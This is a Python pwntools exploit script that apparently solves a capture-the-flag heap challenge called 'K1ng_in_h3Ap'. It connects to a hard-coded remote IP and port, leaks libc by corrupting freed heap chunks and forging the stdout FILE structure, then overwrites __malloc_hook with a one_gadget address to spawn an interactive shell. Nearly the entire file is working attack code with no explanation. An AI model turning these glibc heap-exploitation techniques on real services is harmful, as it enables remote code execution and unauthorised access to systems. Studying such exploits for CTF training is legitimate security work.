# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './K1ng_in_h3Ap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-arm', binary,'-g','1234'])
    #p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.104.175.110'
    port = '20066'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(idx , size):
    cmd(1)
    sla('index',idx)
    sla('size:',size)

def delete(idx):
    cmd(2)
    sla('index' , idx)

def edit(idx , context):
    cmd(3)
    sla('index' , idx)
    sla('context' , context)

one_gad = one_gadget(libc.path)

# 可以尝试打__exit_hook

cmd(666)
ru('0x')
leak = rint(6)
low_base = leak - (0xFFFFFF & libc.sym['printf'])
stdout = libc.sym['_IO_2_1_stdout_'] + low_base

lg('stdout',stdout)
lg('low_base',low_base)

add( 0,0x18 )
add( 1,0x40 )
add( 2,0x60 )
add( 3,0x20 )
add( 4,0x20 )

delete(3)
delete(4)

edit( 0 , flat(0 , 0x31))
edit( 4 , '\x10')
add( 5 , 0x20)
add( 5 , 0x20)
edit(5 , flat( 0 , 0x50+0x71))

delete(2)
delete(1)
add( 6 , 0x40)

edit(2 , p16((stdout & 0xffff) - 0x43))

fake_io = '\x00'*0x33 + flat(0xfbad1800 , 0 , 0, 0 ) + '\x00'
add(7 , 0x68)
add(7 , 0x68)

edit(7 , fake_io)

leak = l64() + 0x20
lg('leak' , leak)

libc.address = leak - libc.sym['_IO_2_1_stdout_']
__malloc_hook = libc.sym['__malloc_hook']
realloc = libc.sym['realloc']
ogg = one_gad[1] + libc.address

lg('ogg' , ogg)
lg('__malloc_hook',__malloc_hook)

add(0,0x60)
add(1,0x20)

delete(0)
edit(0 , p64(__malloc_hook - 0x23))

add(0 , 0x68)
add(0 , 0x68)

edit(0 , '\x00'*(0x13-0x8) + p64(ogg) + p64(realloc + 8))


# dbg('malloc')
add(0 , 0x20)


p.interactive()

'''
@File    :   K1ng_in_h3Ap.py
@Time    :   2021/09/19 11:22:02
@Author  :   Niyah 
'''
